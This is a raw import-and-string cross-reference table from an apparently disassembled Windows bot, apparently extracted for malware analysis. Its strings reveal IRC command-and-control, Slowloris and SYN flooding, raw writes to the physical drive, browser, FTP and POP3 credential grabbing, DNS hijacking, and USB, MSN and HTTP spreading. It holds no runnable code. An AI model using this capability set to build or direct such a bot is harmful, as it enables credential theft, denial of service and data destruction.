reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x479ae7	0x481120	import	0x4799b0	KERNEL32.dll.lstrcpyA
0x479af0	0x482a08	string	0x4799b0	X-a: b\r\n
0x479b00	0x4829f0	string	0x4799b0	Connection: Close\r\n\r\n
0x479b0f	0x481184	import	0x4799b0	KERNEL32.dll.lstrlenA
0x479b51	0x481188	import	0x4799b0	KERNEL32.dll.Sleep
0x479b5e	0x481184	import	0x4799b0	KERNEL32.dll.lstrlenA
0x479b66	0x481174	import	0x4799b0	KERNEL32.dll.GetTickCount
0x479b7f	0x481188	import	0x4799b0	KERNEL32.dll.Sleep
0x479bd2	0x481174	import	0x4799b0	KERNEL32.dll.GetTickCount
0x479be4	0x481184	import	0x4799b0	KERNEL32.dll.lstrlenA
0x479c43	0x481174	import	0x4799b0	KERNEL32.dll.GetTickCount
0x479c9a	0x481180	import	0x479c60	KERNEL32.dll.HeapFree
0x479cb3	0x481120	import	0x479c60	KERNEL32.dll.lstrcpyA
0x479cc4	0x4810a0	import	0x479c60	KERNEL32.dll.lstrcpynA
0x479cf9	0x485e30	string	0x479c60	[Slowloris]: Starting flood on "%s" for %d minute(s)
0x479d45	0x485e68	string	0x479c60	[Slowloris]: Finished flood on "%s"
0x479d73	0x481180	import	0x479c60	KERNEL32.dll.HeapFree
0x479da7	0x481094	import	0x479d90	KERNEL32.dll.VirtualAlloc
0x479dd0	0x482a14	string	0x479d90	\\.\PHYSICALDRIVE0
0x479dd5	0x481110	import	0x479d90	KERNEL32.dll.CreateFileA
0x479e02	0x481098	import	0x479d90	KERNEL32.dll.DeviceIoControl
0x479e21	0x48109c	import	0x479d90	KERNEL32.dll.SetFilePointer
0x479e2a	0x481164	import	0x479d90	KERNEL32.dll.WriteFile
0x479e56	0x48109c	import	0x479d90	KERNEL32.dll.SetFilePointer
0x479ea2	0x481098	import	0x479d90	KERNEL32.dll.DeviceIoControl
0x479eec	0x482a28	string	0x479ec0	00100
0x479f09	0x482a14	string	0x479ec0	\\.\PHYSICALDRIVE0
0x479f16	0x481110	import	0x479ec0	KERNEL32.dll.CreateFileA
0x479f2b	0x481098	import	0x479ec0	KERNEL32.dll.DeviceIoControl
0x479f5a	0x481164	import	0x479ec0	KERNEL32.dll.WriteFile
0x479f77	0x481150	import	0x479ec0	KERNEL32.dll.CloseHandle
0x47a0a2	0x481158	import	0x47a080	KERNEL32.dll.CreateFileW
0x47a0c0	0x481164	import	0x47a080	KERNEL32.dll.WriteFile
0x47a0cb	0x481150	import	0x47a080	KERNEL32.dll.CloseHandle
0x47a0d8	0x481150	import	0x47a080	KERNEL32.dll.CloseHandle
0x47a184	0x4810c8	import	0x47a150	KERNEL32.dll.GetWindowsDirectoryW
0x47a2ab	0x481090	import	0x47a260	KERNEL32.dll.CreateProcessW
0x47a2c5	0x481174	import	0x47a2c0	KERNEL32.dll.GetTickCount
0x47a39f	0x481184	import	0x47a310	KERNEL32.dll.lstrlenA
0x47a3a8	0x4857a0	string	0x47a310	30e4*ga1
0x47a3b0	0x4857a0	string	0x47a310	30e4*ga1
0x47a3bb	0x486904	string	0x47a310	\\.\pipe\%08x_ipc
0x47a3fd	0x4857a0	string	0x47a310	30e4*ga1
0x47a40e	0x4857a0	string	0x47a310	30e4*ga1
0x47a436	0x48119c	import	0x47a310	KERNEL32.dll.EnterCriticalSection
0x47a452	0x481110	import	0x47a310	KERNEL32.dll.CreateFileA
0x47a464	0x481198	import	0x47a310	KERNEL32.dll.LeaveCriticalSection
0x47a484	0x481164	import	0x47a310	KERNEL32.dll.WriteFile
0x47a48b	0x481150	import	0x47a310	KERNEL32.dll.CloseHandle
0x47a496	0x481188	import	0x47a310	KERNEL32.dll.Sleep
0x47a4a1	0x481198	import	0x47a310	KERNEL32.dll.LeaveCriticalSection
0x47a557	0x482a48	string	0x47a550	NtShutdownSystem
0x47a55c	0x4816e8	string	0x47a550	ntdll.dll
0x47a57a	0x481024	import	0x47a550	ADVAPI32.dll.OpenProcessToken
0x47a588	0x482a34	string	0x47a550	SeShutdownPrivilege
0x47a58f	0x481028	import	0x47a550	ADVAPI32.dll.LookupPrivilegeValueA
0x47a5b3	0x48102c	import	0x47a550	ADVAPI32.dll.AdjustTokenPrivileges
0x47a5b9	0x48116c	import	0x47a550	KERNEL32.dll.GetLastError
0x47a659	0x4810cc	import	0x47a5d0	KERNEL32.dll.CreateThread
0x47a661	0x482ad4	string	0x47a5d0	binBot Error
0x47a666	0x482a60	string	0x47a5d0	This binary is invalid.\r\n\r\nMain reasons:\r\n- you stupid cracker\r\n- you stupid cracker...\r\n- you stupid cracker?!\r\n
0x47a66f	0x4812a4	import	0x47a5d0	USER32.dll.MessageBoxA
0x47a678	0x4810f8	import	0x47a5d0	KERNEL32.dll.WaitForSingleObject
0x47a680	0x48108c	import	0x47a5d0	KERNEL32.dll.ExitProcess
0x47a6df	0x481238	import	0x47a690	SHELL32.dll.SHGetSpecialFolderPathW
0x47a6f9	0x481240	import	0x47a690	SHLWAPI.dll.PathAppendW
0x47a70a	0x482af0	string	0x47a690	"%s" %S
0x47a77f	0x481090	import	0x47a690	KERNEL32.dll.CreateProcessW
0x47a7aa	0x481174	import	0x47a790	KERNEL32.dll.GetTickCount
0x47a7dc	0x481188	import	0x47a790	KERNEL32.dll.Sleep
0x47a819	0x481174	import	0x47a800	KERNEL32.dll.GetTickCount
0x47a859	0x481188	import	0x47a800	KERNEL32.dll.Sleep
0x47a8b1	0x481534	string	0x47a880	msnu
0x47a8bd	0x481330	string	0x47a880	pdef
0x47a8c9	0x481b04	string	0x47a880	ffgrab
0x47a8d5	0x481b0c	string	0x47a880	iegrab
0x47a8e1	0x481a9c	string	0x47a880	ftpgrab
0x47a8ed	0x481a68	string	0x47a880	popgrab
0x47a8fc	0x4813e4	string	0x47a880	bdns
0x47a908	0x482b1c	string	0x47a880	usbi
0x47a914	0x482b14	string	0x47a880	httpi
0x47a946	0x482b04	string	0x47a880	http
0x47a956	0x482b04	string	0x47a880	http
0x47a970	0x482b30	string	0x47a970	DnsFlushResolverCache
0x47a975	0x482b24	string	0x47a970	dnsapi.dll
0x47a9ed	0x481090	import	0x47a990	KERNEL32.dll.CreateProcessW
0x47aa39	0x4829e0	string	0x47aa10	Mozilla/4.0
0x47aa45	0x481120	import	0x47aa10	KERNEL32.dll.lstrcpyA
0x47aa60	0x4812b8	import	0x47aa10	WININET.dll.InternetOpenA
0x47aa78	0x481184	import	0x47aa10	KERNEL32.dll.lstrlenA
0x47aa8c	0x4812b4	import	0x47aa10	WININET.dll.InternetOpenUrlA
0x47aac0	0x4812b0	import	0x47aa10	WININET.dll.HttpQueryInfoA
0x47aae2	0x4812ac	import	0x47aa10	WININET.dll.InternetQueryDataAvailable
0x47ab00	0x4812c8	import	0x47aa10	WININET.dll.InternetReadFile
0x47abe7	0x4812c4	import	0x47aa10	WININET.dll.InternetCloseHandle
0x47ac1a	0x481178	import	0x47ac00	KERNEL32.dll.HeapAlloc
0x47ac29	0x4812bc	import	0x47ac00	WININET.dll.HttpQueryInfoW
0x47ac44	0x48116c	import	0x47ac00	KERNEL32.dll.GetLastError
0x47ac5e	0x4811a0	import	0x47ac00	KERNEL32.dll.HeapReAlloc
0x47ac80	0x482b48	string	0x47ac00	POST
0x47ac85	0x481134	import	0x47ac00	KERNEL32.dll.lstrcmpW
0x47ac99	0x481180	import	0x47ac00	KERNEL32.dll.HeapFree
0x47acb2	0x481180	import	0x47ac00	KERNEL32.dll.HeapFree
0x47ad0a	0x481178	import	0x47acd0	KERNEL32.dll.HeapAlloc
0x47ad1a	0x4812c0	import	0x47acd0	WININET.dll.InternetQueryOptionW
0x47ad31	0x48116c	import	0x47acd0	KERNEL32.dll.GetLastError
0x47ad4f	0x4811a0	import	0x47acd0	KERNEL32.dll.HeapReAlloc
0x47ad80	0x48112c	import	0x47acd0	KERNEL32.dll.WideCharToMultiByte
0x47adb3	0x481120	import	0x47acd0	KERNEL32.dll.lstrcpyA
0x47ade6	0x481180	import	0x47acd0	KERNEL32.dll.HeapFree
0x47ae05	0x481184	import	0x47ae00	KERNEL32.dll.lstrlenA
0x47ae13	0x481178	import	0x47ae00	KERNEL32.dll.HeapAlloc
0x47ae69	0x481120	import	0x47ae00	KERNEL32.dll.lstrcpyA
0x47ae7f	0x481088	import	0x47ae00	KERNEL32.dll.lstrcatA
0x47aeb0	0x47af0a	string	0x47ae00	hT+H
0x47aed5	0x481180	import	0x47ae00	KERNEL32.dll.HeapFree
0x47aeeb	0x481180	import	0x47ae00	KERNEL32.dll.HeapFree
0x47af58	0x481120	import	0x47ae00	KERNEL32.dll.lstrcpyA
0x47af70	0x481180	import	0x47ae00	KERNEL32.dll.HeapFree
0x47afaf	0x481184	import	0x47afa0	KERNEL32.dll.lstrlenA
0x47afcb	0x481178	import	0x47afa0	KERNEL32.dll.HeapAlloc
0x47b024	0x482b88	string	0x47afa0	POST /%1023s
0x47b055	0x482b7c	string	0x47afa0	Host:
0x47b08e	0x4810a0	import	0x47afa0	KERNEL32.dll.lstrcpynA
0x47b0d5	0x481178	import	0x47afa0	KERNEL32.dll.HeapAlloc
0x47b0e3	0x482b74	string	0x47afa0	HTTP
0x47b0ff	0x482b68	string	0x47afa0	http://%s/
0x47b11e	0x482b58	string	0x47afa0	http://%s/%s
0x47b13c	0x481180	import	0x47afa0	KERNEL32.dll.HeapFree
0x47b16a	0x481184	import	0x47b160	KERNEL32.dll.lstrlenA
0x47b186	0x481178	import	0x47b160	KERNEL32.dll.HeapAlloc
0x47b199	0x482b98	string	0x47b160	\r\n\r\n
0x47b1d2	0x481178	import	0x47b160	KERNEL32.dll.HeapAlloc
0x47b1e5	0x4810a0	import	0x47b160	KERNEL32.dll.lstrcpynA
0x47b1f8	0x481180	import	0x47b160	KERNEL32.dll.HeapFree
0x47b2ee	0x47b2b0	string	0x47b290	<%u2
0x47b312	0x48117c	import	0x47b300	KERNEL32.dll.GetProcessHeap
0x47b319	0x481178	import	0x47b300	KERNEL32.dll.HeapAlloc
0x47b366	0x482bb4	string	0x47b300	lol.exe
0x47b387	0x4810c8	import	0x47b300	KERNEL32.dll.GetWindowsDirectoryW
0x47b3a1	0x4810b8	import	0x47b300	KERNEL32.dll.lstrcpynW
0x47b3bb	0x481084	import	0x47b300	KERNEL32.dll.GetVolumeInformationW
0x47b3cd	0x481184	import	0x47b300	KERNEL32.dll.lstrlenA
0x47b3d3	0x4857a0	string	0x47b300	30e4*ga1
0x47b3ea	0x4857a0	string	0x47b300	30e4*ga1
0x47b45b	0x482ba0	string	0x47b300	.exe
0x47b461	0x4810bc	import	0x47b300	KERNEL32.dll.lstrcatW
0x47b4a9	0x482c18	string	0x47b480	isadmin
0x47b4ae	0x482c10	string	0x47b480	admin
0x47b4fe	0x481120	import	0x47b480	KERNEL32.dll.lstrcpyA
0x47b536	0x481178	import	0x47b480	KERNEL32.dll.HeapAlloc
0x47b550	0x4810d8	import	0x47b480	KERNEL32.dll.GetVersionExA
0x47b60d	0x481178	import	0x47b480	KERNEL32.dll.HeapAlloc
0x47b620	0x4868e8	string	0x47b480	http://api.wipmania.com/
0x47b63b	0x482be8	string	0x47b480	<br>
0x47b650	0x481184	import	0x47b480	KERNEL32.dll.lstrlenA
0x47b65f	0x481184	import	0x47b480	KERNEL32.dll.lstrlenA
0x47b67d	0x481080	import	0x47b480	KERNEL32.dll.GetLocaleInfoA
0x47b6a8	0x481128	import	0x47b480	KERNEL32.dll.lstrcmpA
0x47b6c5	0x481080	import	0x47b480	KERNEL32.dll.GetLocaleInfoA
0x47b6f9	0x481080	import	0x47b480	KERNEL32.dll.GetLocaleInfoA
0x47b741	0x481178	import	0x47b480	KERNEL32.dll.HeapAlloc
0x47b7f1	0x482bd0	string	0x47b480	n%s_%s_%s%s_%s
0x47b80b	0x482bc4	string	0x47b480	_%s_%s%s_%s
0x47b8be	0x482bd0	string	0x47b480	n%s_%s_%s%s_%s
0x47b8d5	0x482bc4	string	0x47b480	_%s_%s%s_%s
0x47b94b	0x482c20	string	0x47b900	127.0.0.1
0x47b975	0x481188	import	0x47b900	KERNEL32.dll.Sleep
0x47b9bc	0x48119c	import	0x47b990	KERNEL32.dll.EnterCriticalSection
0x47b9d1	0x4812a0	import	0x47b990	USER32.dll.wvsprintfA
0x47b9f2	0x481198	import	0x47b990	KERNEL32.dll.LeaveCriticalSection
0x47ba42	0x4812a0	import	0x47ba00	USER32.dll.wvsprintfA
0x47ba56	0x485d4c	string	0x47ba00	PPPPMSG %s :%s\r\n
0x47ba7f	0x485c54	string	0x47ba70	PASS %s\r\n
0x47ba9c	0x485d24	string	0x47ba70	KCIK %s\r\n
0x47bab4	0x485d10	string	0x47ba70	SDRR %s 0 0 :%s\r\n
0x47bb52	0x481184	import	0x47bb30	KERNEL32.dll.lstrlenA
0x47bba0	0x481128	import	0x47bb80	KERNEL32.dll.lstrcmpA
0x47bbff	0x481128	import	0x47bbb0	KERNEL32.dll.lstrcmpA
0x47bc2c	0x4857a0	string	0x47bbb0	30e4*ga1
0x47bc36	0x485d88	string	0x47bbb0	[v="%s" c="%s" h="%s" p="%S"]
0x47bc89	0x482cf4	string	0x47bbb0	reconnecting
0x47bc8e	0x485d60	string	0x47bbb0	QUIT :%s\r\n
0x47bcc3	0x481184	import	0x47bbb0	KERNEL32.dll.lstrlenA
0x47bce1	0x481180	import	0x47bbb0	KERNEL32.dll.HeapFree
0x47bcec	0x482cf4	string	0x47bbb0	reconnecting
0x47bcf1	0x485d60	string	0x47bbb0	QUIT :%s\r\n
0x47bd28	0x482ce8	string	0x47bbb0	exiting
0x47bd2d	0x485d60	string	0x47bbb0	QUIT :%s\r\n
0x47bd5a	0x482cdc	string	0x47bbb0	removing
0x47bd5f	0x485d60	string	0x47bbb0	QUIT :%s\r\n
0x47bdb2	0x481120	import	0x47bbb0	KERNEL32.dll.lstrcpyA
0x47bdc6	0x481088	import	0x47bbb0	KERNEL32.dll.lstrcatA
0x47bdd5	0x485d30	string	0x47bbb0	SEND %s %s\r\n
0x47be0c	0x482ccc	string	0x47bbb0	#new
0x47be18	0x481120	import	0x47bbb0	KERNEL32.dll.lstrcpyA
0x47be2a	0x485d30	string	0x47bbb0	SEND %s %s\r\n
0x47be72	0x482cbc	string	0x47bbb0	#admin
0x47be79	0x482cb4	string	0x47bbb0	#user
0x47be7f	0x481120	import	0x47bbb0	KERNEL32.dll.lstrcpyA
0x47be91	0x485d30	string	0x47bbb0	SEND %s %s\r\n
0x47becb	0x481120	import	0x47bbb0	KERNEL32.dll.lstrcpyA
0x47bee7	0x481120	import	0x47bbb0	KERNEL32.dll.lstrcpyA
0x47befa	0x481088	import	0x47bbb0	KERNEL32.dll.lstrcatA
0x47bf0c	0x485d30	string	0x47bbb0	SEND %s %s\r\n
0x47bf5f	0x481120	import	0x47bbb0	KERNEL32.dll.lstrcpyA
0x47bf73	0x481088	import	0x47bbb0	KERNEL32.dll.lstrcatA
0x47bf82	0x485d40	string	0x47bbb0	PART %s\r\n
0x47bfa6	0x482ccc	string	0x47bbb0	#new
0x47bfb2	0x481120	import	0x47bbb0	KERNEL32.dll.lstrcpyA
0x47bfc4	0x485d40	string	0x47bbb0	PART %s\r\n
0x47c00c	0x482cbc	string	0x47bbb0	#admin
0x47c013	0x482cb4	string	0x47bbb0	#user
0x47c019	0x481120	import	0x47bbb0	KERNEL32.dll.lstrcpyA
0x47c02b	0x485d40	string	0x47bbb0	PART %s\r\n
0x47c065	0x481120	import	0x47bbb0	KERNEL32.dll.lstrcpyA
0x47c081	0x481120	import	0x47bbb0	KERNEL32.dll.lstrcpyA
0x47c094	0x481088	import	0x47bbb0	KERNEL32.dll.lstrcatA
0x47c0a6	0x485d40	string	0x47bbb0	PART %s\r\n
0x47c0c3	0x485874	string	0x47bbb0	stop
0x47c0e3	0x485840	string	0x47bbb0	stats
0x47c124	0x486054	string	0x47bbb0	[usb="%d" msn="%d" http="%d" total="%d"]
0x47c156	0x486080	string	0x47bbb0	[ftp="%d" pop="%d" http="%d" total="%d"]
0x47c192	0x486054	string	0x47bbb0	[usb="%d" msn="%d" http="%d" total="%d"]
0x47c1b9	0x486080	string	0x47bbb0	[ftp="%d" pop="%d" http="%d" total="%d"]
0x47c1d2	0x485850	string	0x47bbb0	logins
0x47c225	0x481180	import	0x47bbb0	KERNEL32.dll.HeapFree
0x47c25e	0x482c88	string	0x47bbb0	[Logins]: Cleared %d logins
0x47c283	0x482c80	string	0x47bbb0	%s]%s
0x47c2c2	0x481184	import	0x47bbb0	KERNEL32.dll.lstrlenA
0x47c2d2	0x481178	import	0x47bbb0	KERNEL32.dll.HeapAlloc
0x47c2ea	0x481120	import	0x47bbb0	KERNEL32.dll.lstrcpyA
0x47c321	0x4860d0	string	0x47bbb0	[RSOCK4]: Stopped rsock4
0x47c33f	0x485848	string	0x47bbb0	speed
0x47c354	0x481120	import	0x47bbb0	KERNEL32.dll.lstrcpyA
0x47c3fd	0x4857f0	string	0x47bbb0	jps獵 blocks=Basic Latin,CJK Unified Ideographs
0x47c449	0x485d30	string	0x47bbb0	SEND %s %s\r\n
0x47c4bf	0x485d30	string	0x47bbb0	SEND %s %s\r\n
0x47c550	0x485d40	string	0x47bbb0	PART %s\r\n
0x47c572	0x485d40	string	0x47bbb0	PART %s\r\n
0x47c5d0	0x481330	string	0x47bbb0	pdef
0x47c5e2	0x481184	import	0x47bbb0	KERNEL32.dll.lstrlenA
0x47c5f7	0x481178	import	0x47bbb0	KERNEL32.dll.HeapAlloc
0x47c60e	0x481120	import	0x47bbb0	KERNEL32.dll.lstrcpyA
0x47c61f	0x481184	import	0x47bbb0	KERNEL32.dll.lstrlenA
0x47c633	0x481088	import	0x47bbb0	KERNEL32.dll.lstrcatA
0x47c642	0x481088	import	0x47bbb0	KERNEL32.dll.lstrcatA
0x47c679	0x481330	string	0x47bbb0	pdef
0x47c68f	0x481120	import	0x47bbb0	KERNEL32.dll.lstrcpyA
0x47c6d0	0x481120	import	0x47bbb0	KERNEL32.dll.lstrcpyA
0x47c6e0	0x481184	import	0x47bbb0	KERNEL32.dll.lstrlenA
0x47c706	0x481088	import	0x47bbb0	KERNEL32.dll.lstrcatA
0x47c73d	0x481120	import	0x47bbb0	KERNEL32.dll.lstrcpyA
0x47c743	0x481184	import	0x47bbb0	KERNEL32.dll.lstrlenA
0x47c77e	0x4814f8	string	0x47bbb0	msnmsg
0x47c7ce	0x485f50	string	0x47bbb0	[MSN]: Updated MSN spread message to "%s"
0x47c7e7	0x485808	string	0x47bbb0	msn.int
0x47c826	0x481500	string	0x47bbb0	msnint
0x47c859	0x481184	import	0x47bbb0	KERNEL32.dll.lstrlenA
0x47c876	0x485f7c	string	0x47bbb0	[MSN]: Updated MSN spread interval to "%s"
0x47c88f	0x485810	string	0x47bbb0	http.set
0x47c8b5	0x481120	import	0x47bbb0	KERNEL32.dll.lstrcpyA
0x47c8d0	0x481184	import	0x47bbb0	KERNEL32.dll.lstrlenA
0x47c8f5	0x481088	import	0x47bbb0	KERNEL32.dll.lstrcatA
0x47c92c	0x481120	import	0x47bbb0	KERNEL32.dll.lstrcpyA
0x47c955	0x482b04	string	0x47bbb0	http
0x47c972	0x485fa8	string	0x47bbb0	[HTTP]: Updated HTTP spread message to "%s"
0x47c97f	0x48581c	string	0x47bbb0	http.int
0x47c9c0	0x482b04	string	0x47bbb0	http
0x47c9df	0x485ff8	string	0x47bbb0	[HTTP]: Updated HTTP spread interval to "%s"
0x47c9f8	0x485828	string	0x47bbb0	http.inj
0x47ca16	0x482b14	string	0x47bbb0	httpi
0x47ca26	0x482c70	string	0x47bbb0	enabled
0x47ca2b	0x485fd4	string	0x47bbb0	[HTTP]: Injected value is now %s.
0x47ca43	0x482b14	string	0x47bbb0	httpi
0x47ca53	0x482c64	string	0x47bbb0	disabled
0x47ca58	0x485fd4	string	0x47bbb0	[HTTP]: Injected value is now %s.
0x47ca71	0x485838	string	0x47bbb0	mdns
0x47ca9f	0x481184	import	0x47bbb0	KERNEL32.dll.lstrlenA
0x47cadd	0x481178	import	0x47bbb0	KERNEL32.dll.HeapAlloc
0x47caf3	0x481120	import	0x47bbb0	KERNEL32.dll.lstrcpyA
0x47cb36	0x4813e4	string	0x47bbb0	bdns
0x47cb41	0x47a970	string	0x47bbb0	h0+H
0x47cb56	0x482c44	string	0x47bbb0	[DNS]: Redirecting "%s" to "%s"
0x47cb76	0x4813e4	string	0x47bbb0	bdns
0x47cb7b	0x4813dc	string	0x47bbb0	block
0x47cb85	0x47a970	string	0x47bbb0	h0+H
0x47cb95	0x486040	string	0x47bbb0	[DNS]: Blocked "%s"
0x47cbf2	0x47cc0a	string	0x47bbb0	h|bH
0x47cbf4	0x486028	string	0x47bbb0	[Visit]: Visited "%s"
0x47cc0a	0x48627c	string	0x47bbb0	[Visit]: Error visitng "%s"
0x47cc3a	0x481184	import	0x47bbb0	KERNEL32.dll.lstrlenA
0x47cc8b	0x482c34	string	0x47bbb0	%s_%s_%s
0x47cca8	0x482c80	string	0x47bbb0	%s]%s
0x47ccd4	0x481178	import	0x47bbb0	KERNEL32.dll.HeapAlloc
0x47cce4	0x481120	import	0x47bbb0	KERNEL32.dll.lstrcpyA
0x47cd11	0x485860	string	0x47bbb0	slow
0x47cd27	0x482c80	string	0x47bbb0	%s]%s
0x47cd47	0x481184	import	0x47bbb0	KERNEL32.dll.lstrlenA
0x47cd58	0x481178	import	0x47bbb0	KERNEL32.dll.HeapAlloc
0x47cd70	0x481120	import	0x47bbb0	KERNEL32.dll.lstrcpyA
0x47cdfc	0x481534	string	0x47bbb0	msnu
0x47ce55	0x481330	string	0x47bbb0	pdef
0x47ce66	0x481b04	string	0x47bbb0	ffgrab
0x47ce7b	0x481b0c	string	0x47bbb0	iegrab
0x47ce8c	0x481a9c	string	0x47bbb0	ftpgrab
0x47ce9d	0x481a68	string	0x47bbb0	popgrab
0x47ceb2	0x4813e4	string	0x47bbb0	bdns
0x47cec7	0x482b1c	string	0x47bbb0	usbi
0x47cf67	0x4860ac	string	0x47bbb0	[RSOCK4]: Started rsock4 on "%s:%d"
0x47cfe3	0x482c34	string	0x47bbb0	%s_%s_%s
0x47d003	0x481184	import	0x47bbb0	KERNEL32.dll.lstrlenA
0x47d013	0x481178	import	0x47bbb0	KERNEL32.dll.HeapAlloc
0x47d02b	0x481120	import	0x47bbb0	KERNEL32.dll.lstrcpyA
0x47d043	0x485868	string	0x47bbb0	ssyn
0x47d097	0x482c34	string	0x47bbb0	%s_%s_%s
0x47d0b7	0x481184	import	0x47bbb0	KERNEL32.dll.lstrlenA
0x47d0c8	0x481178	import	0x47bbb0	KERNEL32.dll.HeapAlloc
0x47d0dc	0x481120	import	0x47bbb0	KERNEL32.dll.lstrcpyA
0x47d0f0	0x4810cc	import	0x47bbb0	KERNEL32.dll.CreateThread
0x47d0f7	0x481150	import	0x47bbb0	KERNEL32.dll.CloseHandle
0x47d145	0x481128	import	0x47d110	KERNEL32.dll.lstrcmpA
0x47d18c	0x4810a0	import	0x47d110	KERNEL32.dll.lstrcpynA
0x47d198	0x481184	import	0x47d110	KERNEL32.dll.lstrlenA
0x47d231	0x481184	import	0x47d220	KERNEL32.dll.lstrlenA
0x47d243	0x482d18	string	0x47d220	MOTD
0x47d2b5	0x481128	import	0x47d220	KERNEL32.dll.lstrcmpA
0x47d2bb	0x485d78	string	0x47d220	PING
0x47d2d1	0x485d6c	string	0x47d220	PPNG %s\r\n
0x47d2f6	0x47d31d	string	0x47d220	h\f-H
0x47d308	0x485d30	string	0x47d220	SEND %s %s\r\n
0x47d33c	0x485d24	string	0x47d220	KCIK %s\r\n
0x47d351	0x4818c4	string	0x47d220	JOIN
0x47d37f	0x485d80	string	0x47d220	PPPPMSG
0x47d43c	0x485d30	string	0x47d220	SEND %s %s\r\n
0x47d5cd	0x4818d0	string	0x47d530	%s:%d
0x47d5e4	0x481188	import	0x47d530	KERNEL32.dll.Sleep
0x47d659	0x481188	import	0x47d530	KERNEL32.dll.Sleep
0x47d6fd	0x481018	import	0x47d6b0	ADVAPI32.dll.RegCreateKeyExW
0x47d731	0x481000	import	0x47d6b0	ADVAPI32.dll.RegSetValueExW
0x47d740	0x481020	import	0x47d6b0	ADVAPI32.dll.RegCloseKey
0x47d753	0x481020	import	0x47d6b0	ADVAPI32.dll.RegCloseKey
0x47d7b2	0x481178	import	0x47d7a0	KERNEL32.dll.HeapAlloc
0x47d80b	0x481180	import	0x47d7a0	KERNEL32.dll.HeapFree
0x47d819	0x481180	import	0x47d7a0	KERNEL32.dll.HeapFree
0x47d82f	0x48116c	import	0x47d7a0	KERNEL32.dll.GetLastError
0x47d83c	0x481180	import	0x47d7a0	KERNEL32.dll.HeapFree
0x47d852	0x48116c	import	0x47d7a0	KERNEL32.dll.GetLastError
0x47d85b	0x481180	import	0x47d7a0	KERNEL32.dll.HeapFree
0x47d87a	0x481170	import	0x47d7a0	KERNEL32.dll.ReadFile
0x47d8fa	0x4857a0	string	0x47d7a0	30e4*ga1
0x47d900	0x481184	import	0x47d7a0	KERNEL32.dll.lstrlenA
0x47d908	0x4857a0	string	0x47d7a0	30e4*ga1
0x47d916	0x481178	import	0x47d7a0	KERNEL32.dll.HeapAlloc
0x47d952	0x481184	import	0x47d7a0	KERNEL32.dll.lstrlenA
0x47d95e	0x4810a0	import	0x47d7a0	KERNEL32.dll.lstrcpynA
0x47d96d	0x4810a0	import	0x47d7a0	KERNEL32.dll.lstrcpynA
0x47d973	0x481128	import	0x47d7a0	KERNEL32.dll.lstrcmpA
0x47d979	0x4863a0	string	0x47d7a0	ftplog
0x47d98b	0x486298	string	0x47d7a0	[FTP Login]: %s
0x47d99f	0x481184	import	0x47d7a0	KERNEL32.dll.lstrlenA
0x47d9af	0x481178	import	0x47d7a0	KERNEL32.dll.HeapAlloc
0x47d9bb	0x482d3c	string	0x47d7a0	FTP ->
0x47d9c1	0x481120	import	0x47d7a0	KERNEL32.dll.lstrcpyA
0x47d9c9	0x481088	import	0x47d7a0	KERNEL32.dll.lstrcatA
0x47d9e8	0x4863a8	string	0x47d7a0	poplog
0x47d9fb	0x4862a8	string	0x47d7a0	[POP3 Login]: %s
0x47da0f	0x481184	import	0x47d7a0	KERNEL32.dll.lstrlenA
0x47da1f	0x481178	import	0x47d7a0	KERNEL32.dll.HeapAlloc
0x47da2b	0x482d30	string	0x47d7a0	POP3 ->
0x47da31	0x481120	import	0x47d7a0	KERNEL32.dll.lstrcpyA
0x47da39	0x481088	import	0x47d7a0	KERNEL32.dll.lstrcatA
0x47da58	0x4863b0	string	0x47d7a0	ftpinfect
0x47da6b	0x4862bc	string	0x47d7a0	[FTP Infect]: %s was iframed
0x47da83	0x4863c8	string	0x47d7a0	httptraff
0x47da96	0x4862f0	string	0x47d7a0	[HTTP Traffic]: %s
0x47daae	0x4863bc	string	0x47d7a0	httplogin
0x47dac0	0x4862dc	string	0x47d7a0	[HTTP Login]: %s
0x47dad4	0x481184	import	0x47d7a0	KERNEL32.dll.lstrlenA
0x47dae2	0x481178	import	0x47d7a0	KERNEL32.dll.HeapAlloc
0x47daf0	0x481120	import	0x47d7a0	KERNEL32.dll.lstrcpyA
0x47db0f	0x4863d4	string	0x47d7a0	ruskill
0x47db1b	0x482d28	string	0x47d7a0	disable
0x47db38	0x486304	string	0x47d7a0	[Ruskill]: Detected File: "%s"
0x47db50	0x4863dc	string	0x47d7a0	rdns
0x47db62	0x486324	string	0x47d7a0	[Ruskill]: Detected DNS: "%s"
0x47db7a	0x4863e4	string	0x47d7a0	rreg
0x47db8d	0x486344	string	0x47d7a0	[Ruskill]: Detected Reg: "%s"
0x47dbb8	0x486364	string	0x47d7a0	[PDef+]: %s
